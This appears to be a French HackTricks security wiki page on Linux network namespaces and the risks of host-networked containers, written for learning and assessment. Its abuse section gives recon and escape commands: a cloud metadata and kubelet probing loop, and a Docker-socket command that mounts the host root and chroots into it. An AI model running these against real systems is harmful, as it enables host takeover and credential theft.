# Espace de noms réseau

{{#include ../../../../../banners/hacktricks-training.md}}

## Présentation

L'espace de noms réseau isole les ressources liées au réseau telles que les interfaces, adresses IP, tables de routage, état ARP/neighbor, règles de firewall, sockets et le contenu de fichiers comme `/proc/net`. C'est pourquoi un container peut avoir ce qui ressemble à son propre `eth0`, ses propres routes locales, et son propre périphérique loopback sans posséder la pile réseau réelle de l'hôte.

Du point de vue de la sécurité, cela compte car l'isolation réseau va bien au-delà du port binding. Un espace de noms réseau privé limite ce que la charge de travail peut observer ou reconfigurer directement. Une fois que cet espace de noms est partagé avec l'hôte, le container peut soudainement gagner en visibilité sur les listeners de l'hôte, les services locaux de l'hôte, et les points de contrôle réseau qui n'étaient jamais censés être exposés à l'application.

## Fonctionnement

Un espace de noms réseau fraîchement créé commence avec un environnement réseau vide ou presque vide jusqu'à ce que des interfaces y soient attachées. Les runtimes de container créent alors ou connectent des interfaces virtuelles, assignent des adresses et configurent des routes afin que la charge de travail ait la connectivité attendue. Dans des déploiements basés sur un bridge, cela signifie généralement que le container voit une interface soutenue par veth connectée à un bridge de l'hôte. Dans Kubernetes, les plugins CNI gèrent la configuration équivalente pour le networking des Pod.

Cette architecture explique pourquoi `--network=host` ou `hostNetwork: true` représente un changement si radical. Au lieu de recevoir une pile réseau privée préparée, la charge de travail rejoint la pile réelle de l'hôte.

## Laboratoire

Vous pouvez voir un espace de noms réseau presque vide avec:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Et vous pouvez comparer des containers normaux et des containers host-networked avec :
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Le conteneur connecté au réseau de l'hôte n'a plus sa propre vue isolée des sockets et interfaces. Ce changement à lui seul est déjà significatif, avant même de se demander quelles capacités possède le processus.

## Utilisation à l'exécution

Docker et Podman créent normalement un namespace réseau privé pour chaque conteneur sauf configuration contraire. Kubernetes donne habituellement à chaque Pod son propre namespace réseau, partagé par les conteneurs à l'intérieur de ce Pod mais séparé de l'hôte. Les systèmes Incus/LXC fournissent également une isolation riche basée sur les namespaces réseau, souvent avec une plus grande variété de configurations de réseau virtuel.

Le principe courant est que le réseau privé constitue la frontière d'isolation par défaut, tandis que l'utilisation du réseau de l'hôte est une dérogation explicite à cette frontière.

## Mauvaises configurations

La mauvaise configuration la plus importante est simplement le partage du namespace réseau de l'hôte. Cela se fait parfois pour des raisons de performance, de monitoring bas‑niveau, ou de commodité, mais cela supprime l'une des frontières les plus nettes disponibles pour les conteneurs. Les listeners locaux à l'hôte deviennent atteignables de manière plus directe, les services accessibles uniquement sur localhost peuvent devenir accessibles, et des capacités comme `CAP_NET_ADMIN` ou `CAP_NET_RAW` deviennent beaucoup plus dangereuses parce que les opérations qu'elles permettent s'appliquent désormais à l'environnement réseau de l'hôte.

Un autre problème est l'octroi excessif de capacités liées au réseau même lorsque le namespace réseau est privé. Un namespace privé aide, mais il ne rend pas inoffensifs les raw sockets ou le contrôle réseau avancé.

## Abus

Dans des configurations faiblement isolées, un attaquant peut inspecter les services en écoute de l'hôte, atteindre des endpoints de gestion liés uniquement au loopback, sniffer ou interférer avec le trafic selon les capacités et l'environnement exacts, ou reconfigurer le routage et l'état du pare‑feu si `CAP_NET_ADMIN` est présent. Dans un cluster, cela facilite aussi les déplacements latéraux et la reconnaissance du control-plane.

Si vous suspectez l'utilisation du réseau de l'hôte, commencez par confirmer que les interfaces et listeners visibles appartiennent à l'hôte plutôt qu'à un réseau de conteneur isolé :
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Les services loopback-only sont souvent la première découverte intéressante :
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Si des capacités réseau sont présentes, vérifiez si la charge de travail peut inspecter ou modifier la pile visible :
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Dans des environnements de cluster ou cloud, la mise en réseau de l'hôte justifie également une recon locale rapide des métadonnées et des services adjacents au control-plane :
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Exemple complet : réseau de l'hôte + accès au runtime local / Kubelet

Le réseau de l'hôte n'accorde pas automatiquement l'accès root de l'hôte, mais il expose souvent des services qui sont intentionnellement accessibles uniquement depuis le nœud lui-même. Si l'un de ces services est faiblement protégé, le réseau de l'hôte devient une voie directe d'élévation de privilèges.

Docker API sur localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet sur localhost :
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact :

- compromission directe de l'hôte si une API runtime locale est exposée sans protection adéquate
- reconnaissance du cluster ou mouvement latéral si kubelet ou des agents locaux sont accessibles
- manipulation du trafic ou déni de service lorsqu'il est combiné avec `CAP_NET_ADMIN`

## Vérifications

L'objectif de ces vérifications est de déterminer si le processus possède une pile réseau privée, quelles routes et quels listeners sont visibles, et si la vue réseau ressemble déjà à celle de l'hôte avant même de tester les capabilities.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Ce qui est intéressant ici :

- Si l'identifiant du network namespace ou l'ensemble d'interfaces visibles ressemble à l'hôte, host networking peut déjà être utilisé.
- `ss -lntup` est particulièrement précieux car il révèle les listeners uniquement sur loopback et les endpoints de gestion locaux.
- Les routes, les noms d'interface et le contexte du pare-feu deviennent beaucoup plus importants si `CAP_NET_ADMIN` ou `CAP_NET_RAW` est présent.

Lors de l'examen d'un container, évaluez toujours le network namespace conjointement avec le capability set. Host networking associé à de fortes capacités réseau est une posture très différente de bridge networking associé à un ensemble de capacités par défaut restreint.
{{#include ../../../../../banners/hacktricks-training.md}}
